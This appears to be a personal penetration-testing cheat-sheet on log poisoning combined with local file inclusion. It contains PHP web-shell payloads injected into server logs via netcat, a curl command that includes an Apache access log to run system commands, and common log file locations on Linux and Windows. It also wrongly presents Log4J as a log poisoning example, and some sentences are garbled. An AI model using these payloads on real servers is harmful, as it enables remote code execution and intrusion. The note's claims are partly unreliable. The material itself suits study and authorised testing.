# Log Poisoning

## Introduction

Log Poisoning is a type of [[File-Inclusion]] related attack that seeks to inject the log file of a server with malicious request that include code to then can then be used in an LFI payload. The infamous [[Log4J]] exploit is the famous recent example of Log Poisoning that leads to Remote Code Execution. Simple example being:
```bash
nc -nv $poor_web_server_ip 80
(UNKNOWN) [$poor_web_server_ip] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

## File Inclusion Code Execution

Vulnerable parameter `?file=` and  `&cmd`

```bash
curl "http://$poor_web_server/menu.php?file=c:\xampp\apache\logs\access.log&cmd=dir"
```

## Log File Locations:

To perform log poisoning we require a log file to poison. 

Linux
```bash
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access.log
# FreeBSD
/var/log/httpd-access.log
```
Windows
```
C:\xampp\apache\logs\access.log
```

[https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage](https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage)
`C:\inetpub\logs\LogFiles\W3SVC1\`
`C:\inetpub\wwwroot\web.config`
Apache logs can be found in `C:\xampp\apache\logs`


## Located Controllable Log Fields

Use Burpsuite ([[Burpsuite-Helpsheet]]) or combination of `curl` ([[Curl-Cheatsheet]]) modifying the various possible fields contained in the log. 

```bash
# curl to burp proxy
curl 127.0.0.1 --proxy 8000
```

```bash
# Test Symbol filtering 
User-Agent: Add your testing message here" 
```
Test Symbol filtering most importantly the quotation escaping like the above.
```
# From: !@#$%$^&*()"':;<>,.?/`~ 
```

Controlling a modifiable field then leads to test whether the server or website language can execute code from this log file.  Beware of server side language handling the code. Notably if you see (for example `<?php`) script tags and the following executable code then there this code is not being passed to a function  that can execute the code.  

```php
<?php system($_REQUEST['cmd']); ?>
```

`url:/path/to/log/logname.log&cmd=

## References

[https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage](https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage)